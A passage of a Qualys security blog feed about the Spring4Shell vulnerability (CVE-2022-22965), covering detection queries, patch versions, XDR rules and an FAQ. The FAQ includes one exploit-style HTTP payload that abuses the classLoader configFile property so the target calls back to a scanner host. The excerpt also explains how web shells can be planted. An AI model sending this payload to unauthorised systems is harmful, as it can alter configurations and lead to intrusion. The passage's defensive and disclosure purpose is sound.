height="275" src="https://blog.qualys.com/wp-content/uploads/2022/04/WAS-1.png" alt="" class="wp-image-29792" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/WAS-1.png 885w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/WAS-1-300x93.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/WAS-1-768x239.png 768w" sizes="(max-width: 885px) 100vw, 885px" /></figure>



<p>These QIDs collectively use a combination of Out-of-Band and non-Out-of-Band tests for accurate detection.&nbsp;&nbsp;&nbsp;</p>



<figure class="wp-block-image size-full"><img data-attachment-id="29793" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/was-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/WAS-2.png" data-orig-size="868,259" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="WAS-2" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/WAS-2-300x90.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/WAS-2.png" loading="lazy" width="868" height="259" src="https://blog.qualys.com/wp-content/uploads/2022/04/WAS-2.png" alt="" class="wp-image-29793" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/WAS-2.png 868w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/WAS-2-300x90.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/WAS-2-768x229.png 768w" sizes="(max-width: 868px) 100vw, 868px" /></figure>



<p>The WAS Research Team is investigating other safe methods for detecting this vulnerability to compensate for potential False Negatives or False Positive cases.&nbsp; In the meantime, it is recommended to use WAS in coordination with other Qualys modules for a more comprehensive methodology for detecting the Spring4Shell vulnerability.&nbsp;</p>



<p>If your application is vulnerable to Spring4Shell, it is recommended that you immediately follow the steps outlined in the “Is there a patch available for Spring4Shell?” section of this blog.&nbsp;</p>



<h3>Detect Spring4Shell Vulnerability Using Qualys VMDR</h3>



<p>Next, it’s time to find Spring4Shell wherever it is hiding in your environment and prioritize your response. </p>



<p>Qualys VMDR customers should ensure all their assets are scanned against the above QIDs. As this vulnerability only targets the Spring Framework when deployed with JDK&gt;9 and Tomcat, customers must at least ensure assets with Tomcat and JDK&gt;9 are scanned. The following QQL can be used to find such assets:&nbsp;</p>



<pre class="wp-block-code"><code>software:(name:tomcat and not update:&#91;`10.0.20`,`9.0.62`,`8.5.78`]) and software:(name:"jdk" and version&gt;=9)&nbsp;</code></pre>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29795" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/csamspring" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/csamspring.jpg" data-orig-size="2460,1384" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="csamspring" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/csamspring-300x169.jpg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/csamspring-1070x602.jpg" loading="lazy" width="1070" height="602" src="https://blog.qualys.com/wp-content/uploads/2022/04/csamspring-1070x602.jpg" alt="" class="wp-image-29795" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/csamspring-1070x602.jpg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/csamspring-300x169.jpg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/csamspring-768x432.jpg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/csamspring-1536x864.jpg 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/csamspring-2048x1152.jpg 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>Once assets have been scanned for the above QIDs, customers can use the following QQL to search for the Spring4Shell vulnerability in their environment:&nbsp;</p>



<p>vulnerabilities.vulnerability.qid:376506&nbsp;</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29796" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/vulnspringshell-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/vulnspringshell.jpg" data-orig-size="2460,1384" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vulnspringshell" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/vulnspringshell-300x169.jpg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/vulnspringshell-1070x602.jpg" loading="lazy" width="1070" height="602" src="https://blog.qualys.com/wp-content/uploads/2022/04/vulnspringshell-1070x602.jpg" alt="" class="wp-image-29796" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/vulnspringshell-1070x602.jpg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/vulnspringshell-300x169.jpg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/vulnspringshell-768x432.jpg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/vulnspringshell-1536x864.jpg 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/vulnspringshell-2048x1152.jpg 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h3>Track Spring4Shell Progress with Unified Dashboard</h3>



<p>The Unified Dashboard enables you to track this vulnerability and its impacted hosts, their status, and overall management in real-time. To help you quickly find vulnerable hosts and software, a new unified dashboard is created on the Qualys platform. This dashboard has extremely useful widgets listing all the vulnerable hosts, applications with vulnerable versions of Spring, and most importantly all the vulnerable hosts visible on the Internet. It provides visibility to compliance configurations and software on your ‘External Attack Surface’ visible on <a rel="noreferrer noopener" href="https://blog.qualys.com/vulnerabilities-threat-research/2021/12/20/qualys-integrates-with-shodan-to-help-map-the-external-attack-surface" target="_blank">Shodan</a> being the low-hanging opportunities for attackers. These widgets also list workloads hosted on shared cloud infrastructure and that have public IP addresses. To use this capability, download and import this Global Dashboard.&nbsp;</p>



<div class="wp-block-file"><a id="wp-block-file--media-90c00282-3a07-4f7a-b3a9-791a4532d1cf" href="https://blog.qualys.com/wp-content/uploads/2022/04/QLYS-Spring4Shell-Dashboard-2.zip"><a href="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/QLYS-Spring4Shell-Dashboard.zip">Download and import “Spring4Shell” Global Dashboard</a></a><a href="https://blog.qualys.com/wp-content/uploads/2022/04/QLYS-Spring4Shell-Dashboard-2.zip" class="wp-block-file__button" download aria-describedby="wp-block-file--media-90c00282-3a07-4f7a-b3a9-791a4532d1cf">Download</a></div>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29797" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/sping4shell" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Sping4shell.jpg" data-orig-size="2369,2310" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Sping4shell" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Sping4shell-300x293.jpg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Sping4shell-1070x1043.jpg" loading="lazy" width="1070" height="1043" src="https://blog.qualys.com/wp-content/uploads/2022/04/Sping4shell-1070x1043.jpg" alt="" class="wp-image-29797" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Sping4shell-1070x1043.jpg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Sping4shell-300x293.jpg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Sping4shell-768x749.jpg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Sping4shell-1536x1498.jpg 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Sping4shell-2048x1997.jpg 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h3>Detect Spring4Shell Vulnerabilities in Running Containers &amp; Images</h3>



<p>If you run Apache Tomcat in containers, then it is critical that you check for Spring4Shell vulnerabilities, given the high severity of this potential exploit. Qualys Container Security offers multiple methods to help you detect Spring4Shell vulnerabilities in your container environment. The Container Security sensor checks both running containers and container images for the following vulnerabilities:&nbsp;</p>



<ul><li>QID 376506(CVE-2022-22965)&nbsp;</li><li>QID 376508 (CVE-2022-22963&nbsp;</li></ul>



<p>To detect vulnerabilities in running containers, you must deploy the Container Security sensor in “General” mode on the hosts running the containers. You can view the containers impacted by these vulnerabilities by navigating to the “Container Security” application, then selecting the “Assets-&gt; Container” tab, and using the following QQL query:&nbsp;&nbsp;&nbsp;</p>



<p>vulnerabilities.qid:376506 or vulnerabilities.qid:376508&nbsp;</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29799" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/cs-1" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-1.png" data-orig-size="1724,527" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CS-1" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-1-300x92.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-1-1070x327.png" loading="lazy" width="1070" height="327" src="https://blog.qualys.com/wp-content/uploads/2022/04/CS-1-1070x327.png" alt="" class="wp-image-29799" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-1-1070x327.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-1-300x92.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-1-768x235.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-1-1536x470.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-1.png 1724w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>To view details of the vulnerability, you can click on the vulnerable container and navigate to the “Vulnerabilities” tab as shown in the screenshot below:&nbsp;</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29800" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/cs-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-2.png" data-orig-size="1720,559" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CS-2" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-2-300x98.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-2-1070x348.png" loading="lazy" width="1070" height="348" src="https://blog.qualys.com/wp-content/uploads/2022/04/CS-2-1070x348.png" alt="" class="wp-image-29800" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-2-1070x348.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-2-300x98.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-2-768x250.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-2-1536x499.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-2.png 1720w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>In addition to scanning running containers, Qualys recommends that you scan container images for Spring4Shell vulnerabilities. Catching and remediating Spring4Shell vulnerabilities in container images will eliminate exposure to the vulnerabilities when the image is instantiated as a container.&nbsp;</p>



<p>To view all the impacted images, navigate to the Qualys Container Security app, then select the “Assets -&gt; Images” tab, and use the following QQL query:&nbsp;&nbsp;</p>



<pre class="wp-block-code"><code>vulnerabilities.qid:376506 or vulnerabilities.qid:376508&nbsp;</code></pre>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29801" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/cs-3" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-3.png" data-orig-size="1720,519" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CS-3" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-3-300x91.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-3-1070x323.png" loading="lazy" width="1070" height="323" src="https://blog.qualys.com/wp-content/uploads/2022/04/CS-3-1070x323.png" alt="" class="wp-image-29801" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-3-1070x323.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-3-300x91.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-3-768x232.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-3-1536x463.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-3.png 1720w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>To view details of the vulnerability, you can click on the image and navigate to the “Vulnerabilities” tab as shown in the screenshot below:&nbsp;</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29802" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/cs-4" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-4.png" data-orig-size="1720,602" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CS-4" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-4-300x105.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/CS-4-1070x375.png" loading="lazy" width="1070" height="375" src="https://blog.qualys.com/wp-content/uploads/2022/04/CS-4-1070x375.png" alt="" class="wp-image-29802" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-4-1070x375.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-4-300x105.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-4-768x269.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-4-1536x538.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CS-4.png 1720w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>Qualys Container Security offers a comprehensive solution for detecting vulnerabilities, including Spring4Shell, across the entire lifecycle of the container from build time to runtime.&nbsp;</p>



<h3>Remediate Spring4Shell Using Qualys Patch Management</h3>



<p>The recommended way to patch this vulnerability is by updating to Spring Framework 5.3.18 and 5.2.20 or greater. Customers can use Patch Management’s install software action to download and script the upgrade. Note that customers can create a patch job that only includes the install/script action, in such case there is no need to add patches to the job. Alternatively, if upgrading the Spring Framework is not possible, customers can use Qualys patch management to patch Tomcat to versions: 10.0.20, 9.0.62, or 8.5.78. Tomcat patches are supported out-of-the-box and require no special configuration.&nbsp;&nbsp;</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29798" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/patchspring" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/patchspring.jpg" data-orig-size="2460,1384" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="patchspring" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/patchspring-300x169.jpg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/patchspring-1070x602.jpg" loading="lazy" width="1070" height="602" src="https://blog.qualys.com/wp-content/uploads/2022/04/patchspring-1070x602.jpg" alt="" class="wp-image-29798" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/patchspring-1070x602.jpg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/patchspring-300x169.jpg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/patchspring-768x432.jpg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/patchspring-1536x864.jpg 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/patchspring-2048x1152.jpg 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h3>Detect Spring4Shell Exploitation Attempts with Qualys XDR</h3>



<p>An important last step in confronting Spring4Shell is to ensure that your organization has not already been targeted by attacks that exploit this vulnerability. &nbsp;</p>



<p>The Qualys Threat Intelligence team has released the following XDR correlation rules for detecting Remote Code Execution exploitation attempts. These rules are available today via your TAM for quick import and implementation and will be delivered as part of a rule pack in a future XDR release.&nbsp;</p>



<p>T1190 &#8211; [Palo Alto Firewall] Spring4Shell RCE Vulnerability Exploitation Detected (CVE-2022-22965)&nbsp;</p>



<p>T1190 &#8211; [Check Point IPS] Spring4Shell RCE Vulnerability Exploitation Detected (CVE-2022-22965)&nbsp;</p>



<p>T1190 &#8211; [Fortinet Firewall] Spring4Shell RCE Vulnerability Exploitation Detected (CVE-2022-22965)&nbsp;</p>



<p>T1190 &#8211; [Trend Micro TippingPoint IPS] Spring4Shell RCE Vulnerability Exploitation Detected (CVE-2022-22965)&nbsp;</p>



<h3>FAQ:&nbsp;</h3>



<h4>Is this vulnerability related to CVE-2022-22963?&nbsp;</h4>



<p>There is some confusion about this zero-day vulnerability due to another unrelated Spring vulnerability (CVE-2022-22963) published on March 29, 2022. This vulnerability, CVE-2022-22963, impacts Spring Cloud Function, which is not in Spring Framework.&nbsp;&nbsp;</p>



<p>QIDs 376508 and 730418 are available to address this CVE.&nbsp;</p>



<h4>What is the detection logic for QID 376506: Spring Core Remote Code Execution (RCE) Vulnerability (Spring4Shell)?&nbsp;</h4>



<p>QID 376506 is an authenticated check currently supported on Linux and Windows Operating Systems.&nbsp;</p>



<p>On Linux systems, detection checks if system has java 9 or later versions and executes ‘locate’ and ‘&nbsp; ls -l /proc/*/fd&nbsp; ‘ to checks if one of the ‘&nbsp; spring-webmvc-*.jar&nbsp; ‘, ‘&nbsp; spring-webflux*.jar&nbsp; ‘ or ‘&nbsp; spring-boot.*jar&nbsp; ‘ present on the system.&nbsp;</p>



<p>On Windows system, detection checks vulnerable instances of Spring via WMI to check spring-webmvc, spring-webflux and spring-boot are included in the running processes via command-line with JDK9 or higher.&nbsp;</p>



<p>Container Sensor image scanning uses find command to check for spring-webmvc, spring-webflux and spring-boot jars from .war files along with JDK9 or higher.&nbsp;</p>



<h4>Under what situations would QID 376506 not detect the vulnerability?&nbsp;</h4>



<p>QID 376506 might not be detected if access to /proc/*/fd is restricted or if the spring-core or spring-beans file is embedded inside other binaries, such as jar, war, etc.&nbsp;</p>



<p>Furthermore, this QID might not be detected if the locate command is not available on the target. Targets on Java versions less than 9 are not vulnerable.&nbsp;</p>



<h4>What is the detection logic for QID 730416 (unauthenticated check)? </h4>



<p>QID 730416 is a remote unauthenticated check. It sends a specially crafted HTTP GET request to the remote web application and tries to get a callback on scanner using payload: </p>



<pre class="wp-block-code"><code>"?class.module.classLoader.resources.context.configFile=http://&lt;Scanner_IP&gt;:&lt;Random_port&gt;&amp;class.module.classLoader.resources.context.configFile"&nbsp;</code></pre>



<p>QID 730416 is an intrusive check. The payload used in the detection may in some cases change the Spring configuration on the target application which can hamper the application&#8217;s logging capabilities.&nbsp;</p>



<h4>Under what conditions would QID 730416 not work? </h4>



<p>QID 730416 will not work if the following conditions are present:&nbsp;</p>



<ul><li>&#8220;Do not exclude Intrusive checks&#8221; is not enabled in Scan Option Profile&nbsp;</li><li>This QID only checks for the vulnerability at root URI. If the vulnerability lies in non-root URIs, the QID would not be detected.&nbsp;</li><li>If communication from host to scanner is blocked.&nbsp;</li><li>The payload gets blocked by a firewall, IPS, etc. that is between the host and the scanner.&nbsp;</li></ul>



<h3>Updates</h3>



<p><strong>Update – April </strong>7&nbsp;</p>



<p>A new QID (730416) was added to address CVE-2022-22963 under “QID Coverage”. &nbsp;</p>



<p><strong>Update – April 6</strong>&nbsp;</p>



<p>Several new QIDs to address CVE-2022-22963 are now available under “QID Coverage”. The CSAM section has been expanded. &nbsp;</p>



<p><strong>U</strong><strong>pdate – April 5</strong><strong></strong>&nbsp;</p>



<p>Guidance added for detection using Qualys CSAM, VMDR and XDR, and tracking remediation progress using Unified Dashboards and Patch Management.&nbsp;</p>



<p><strong>Update – April 4</strong><strong> </strong>&nbsp;</p>



<p>Qualys has added a <a rel="noreferrer noopener" href="https://github.com/Qualys/spring4scanwin" target="_blank">scan utility</a> for Windows and <a rel="noreferrer noopener" href="https://github.com/Qualys/spring4scanlinux" target="_blank">scan utility</a> for Linux to scan the entire hard drive(s), including archives (and nested JARs,) that indicate the Java application contains a vulnerable Spring Framework or Spring Cloud library.&nbsp;</p>



<p><strong>Update – April 1</strong>&nbsp;</p>



<p>New QIDs to address CVE-2022-22963 are now available. See section “QID Coverage” section.&nbsp;</p>



<p><strong>Update – March 31</strong>&nbsp;</p>



<p>CVE-2022-22965 is now assigned to this vulnerability.&nbsp; Qualys Research Team has released QIDs as of March 30 and will keep updating those QIDs as new information is available.&nbsp;</p>
]]></content:encoded>
      <wfw:commentRss>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/feed</wfw:commentRss>
      <slash:comments>8</slash:comments>
      <authorTitle><![CDATA[Director, Vulnerability and Threat Research, Qualys]]></authorTitle>
      <authorAvatar><![CDATA[https://secure.gravatar.com/avatar/b23b99e61d4ce29240012f2740ad1801?s=192&d=mm&r=g]]></authorAvatar>
      <authorPosts><![CDATA[https://blog.qualys.com/author/bharat_jogi]]></authorPosts>
      <postCategory>
        <name><![CDATA[Vulnerabilities and Threat Research]]></name>
        <link><![CDATA[https://blog.qualys.com/category/vulnerabilities-threat-research]]></link>
      </postCategory>
      <customExcerpt><![CDATA[
<p><em>This page last updated: April 7<sup>th</sup></em></p>



<p>A new zero-day Remote Code Execution (RCE) vulnerability, “Spring4Shell” or “SpringShell” was disclosed in the Spring framework. An unauthorized attacker can exploit this vulnerability to remotely execute arbitrary code on the target device.&nbsp;</p>



<h3>What is Spring Framework?&nbsp;</h3>



<p>Spring-core is a prevalent framework widely used in Java applications that allows software developers to develop Java applications with enterprise-level components effortlessly.&nbsp;</p>



<h3>Which versions are vulnerable?&nbsp;</h3>



<p>The vulnerability requires JDK version 9 or later to be running. Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions are vulnerable. It allows remote attackers to plant a web shell when running Spring framework apps on top of JRE 9. It is caused by unsafe deserialization of given arguments that a simple HTTP POST request can trigger to allow full remote access.&nbsp;</p>



<h3>How can this be exploited?&nbsp;</h3>



<p>The exploitation of this vulnerability relies on an endpoint with DataBinder enabled, which decodes data from the request body automatically. This property could enable an attacker to leverage Spring4Shell against a vulnerable application. In fact, the Spring framework class DataBinder warns about this in its <a rel="noreferrer noopener" href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/validation/DataBinder.html" target="_blank">documentation</a>:&nbsp;</p>



<p>“Note that there are potential security implications in failing to set an array of allowed fields. In the case of HTTP form POST data, for example, malicious clients can attempt to subvert an application by supplying values for fields or properties that do not exist on the form. In some cases, this could lead to illegal data being set on command objects or their nested objects. For this reason, it is highly recommended to specify the allowedFields property on the DataBinder.”&nbsp;</p>



]]></customExcerpt>
    </item>
    <item>
      <title>Implications of Windows Subsystem for Linux for Adversaries &amp; Defenders (Part 1)</title>
